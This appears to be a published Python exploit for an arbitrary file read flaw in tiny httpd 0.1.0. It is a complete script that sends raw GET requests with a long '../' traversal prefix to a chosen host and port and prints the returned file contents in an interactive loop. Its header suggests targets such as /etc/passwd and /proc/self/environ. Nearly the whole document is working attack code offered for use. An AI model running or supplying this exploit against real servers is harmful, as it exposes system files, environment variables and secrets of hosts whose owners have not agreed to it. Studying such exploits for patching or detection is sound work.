# Exploit Title: tiny httpd 0.1.0 arbritrary file read vulnerability.
# Date: December 18, 2021
# Exploit Author: c0braKai
# recommended files to test with: /etc/hosts or /etc/passwd or /proc/self/stat or /proc/self/environ
# Version: 1.0.0
# Tested on: Ubuntu 21.04
#!/usr/bin/env python3

import socket, time, argparse


def lfi(target_ip, target_port, path):
    if path == 'exit':
        exit()
    else:
        payload = 'GET'
        payload += ' '
        payload += '/../../../../../../../../../../..'
        payload += path
        payload += ' '
        payload += 'HTTP/1.1'
        payload += ' '
        payload += '\r\n\r\n'
        send_payload(target_ip, target_port, payload)
            
def send_payload(ip, port, payload):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.sendall(bytes(payload, 'UTF-8'))
    time.sleep(3)
    msg = s.recv(4096)
    print(msg.decode())
    s.close()


def main():
    '''Grabs user arguments and calls appropriate functions.'''
    parser = argparse.ArgumentParser(description='Provide the url for the vulnerable tiny httpd server.')
    parser.add_argument('-v', '--version', dest='ver', required=False, action='store_true', help='display version number.')
    parser.add_argument('-t', '--target', dest='target', required=False, type=str, help="provide a target url ex: http://10.10.10.10")
    parser.add_argument('-p', '--port', dest='port', required=False, type=int, help="provide a target url ex: http://10.10.10.10")
    args = parser.parse_args()
    target_ip = args.target
    target_port = args.port


    if args.ver:
        print("tinyHttpdLFI version 0.1")
        exit()
    target = args.target
    if target == None:
        print('Usage: python3 tinyHttpdLFI.py -t [url] -p [port]')
        exit(0)
    else:
        print("Type 'exit' at the prompt to quit.")
        while True:
            path = input('Provide a path # ')
            lfi(target_ip, target_port, path)
        
if __name__ == '__main__':
    main()

